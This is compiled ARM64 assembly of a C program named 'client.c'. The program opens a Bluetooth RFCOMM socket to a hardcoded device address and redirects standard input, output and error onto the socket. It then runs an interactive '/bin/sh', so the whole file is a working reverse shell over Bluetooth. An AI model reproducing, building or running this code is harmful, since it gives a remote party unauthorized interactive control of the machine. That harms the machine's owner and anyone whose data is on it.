	.arch armv8-a
	.file	"client.c"
	.text
	.section	.rodata
	.align	3
.LC4:
	.string	"Socket creation failed"
	.align	3
.LC5:
	.string	"[*] Trying to connect to %s on port %d...\n"
	.align	3
.LC6:
	.string	"[!] Connection failed: %s (errno: %d)\n"
	.align	3
.LC7:
	.string	"[+] Connected successfully!"
	.align	3
.LC0:
	.string	"/bin/sh"
	.text
	.align	2
	.global	main
	.type	main, %function
main:
.LFB24:
	.cfi_startproc
	stp	x29, x30, [sp, -112]!
	.cfi_def_cfa_offset 112
	.cfi_offset 29, -112
	.cfi_offset 30, -104
	mov	x29, sp
	str	x19, [sp, 16]
	.cfi_offset 19, -96
	str	xzr, [sp, 88]
	strh	wzr, [sp, 96]
	adrp	x0, .LC3
	add	x0, x0, :lo12:.LC3
	add	x2, sp, 64
	mov	x3, x0
	ldp	x0, x1, [x3]
	stp	x0, x1, [x2]
	ldrh	w0, [x3, 16]
	strh	w0, [x2, 16]
	mov	w0, 1
	strb	w0, [sp, 111]
	mov	w2, 3
	mov	w1, 1
	mov	w0, 31
	bl	socket
	str	w0, [sp, 104]
	ldr	w0, [sp, 104]
	cmp	w0, 0
	bge	.L2
	adrp	x0, .LC4
	add	x0, x0, :lo12:.LC4
	bl	perror
	mov	w0, 1
	b	.L5
.L2:
	mov	w0, 31
	strh	w0, [sp, 88]
	ldrb	w0, [sp, 111]
	strb	w0, [sp, 96]
	add	x0, sp, 88
	add	x1, x0, 2
	add	x0, sp, 64
	bl	str2ba
	ldrb	w1, [sp, 111]
	add	x0, sp, 64
	mov	w2, w1
	mov	x1, x0
	adrp	x0, .LC5
	add	x0, x0, :lo12:.LC5
	bl	printf
	add	x0, sp, 88
	mov	w2, 10
	mov	x1, x0
	ldr	w0, [sp, 104]
	bl	connect
	str	w0, [sp, 100]
	ldr	w0, [sp, 100]
	cmp	w0, 0
	bge	.L4
	bl	__errno_location
	ldr	w0, [x0]
	bl	strerror
	mov	x19, x0
	bl	__errno_location
	ldr	w0, [x0]
	mov	w2, w0
	mov	x1, x19
	adrp	x0, .LC6
	add	x0, x0, :lo12:.LC6
	bl	printf
	ldr	w0, [sp, 104]
	bl	close
	mov	w0, 1
	b	.L5
.L4:
	adrp	x0, .LC7
	add	x0, x0, :lo12:.LC7
	bl	puts
	mov	w1, 0
	ldr	w0, [sp, 104]
	bl	dup2
	mov	w1, 1
	ldr	w0, [sp, 104]
	bl	dup2
	mov	w1, 2
	ldr	w0, [sp, 104]
	bl	dup2
	adrp	x0, .LC8
	add	x0, x0, :lo12:.LC8
	add	x2, sp, 40
	mov	x3, x0
	ldp	x0, x1, [x3]
	stp	x0, x1, [x2]
	ldr	x0, [x3, 16]
	str	x0, [x2, 16]
	add	x0, sp, 40
	mov	x2, 0
	mov	x1, x0
	adrp	x0, .LC0
	add	x0, x0, :lo12:.LC0
	bl	execve
	ldr	w0, [sp, 104]
	bl	close
	mov	w0, 0
.L5:
	ldr	x19, [sp, 16]
	ldp	x29, x30, [sp], 112
	.cfi_restore 30
	.cfi_restore 29
	.cfi_restore 19
	.cfi_def_cfa_offset 0
	ret
	.cfi_endproc
.LFE24:
	.size	main, .-main
	.section	.rodata
	.align	3
.LC3:
	.string	"D8:3A:DD:47:FE:9B"
	.align	3
.LC1:
	.string	"-i"
	.data
	.align	3
.LC8:
	.xword	.LC0
	.xword	.LC1
	.xword	0
	.text
	.ident	"GCC: (Debian 12.2.0-14) 12.2.0"
	.section	.note.GNU-stack,"",@progbits
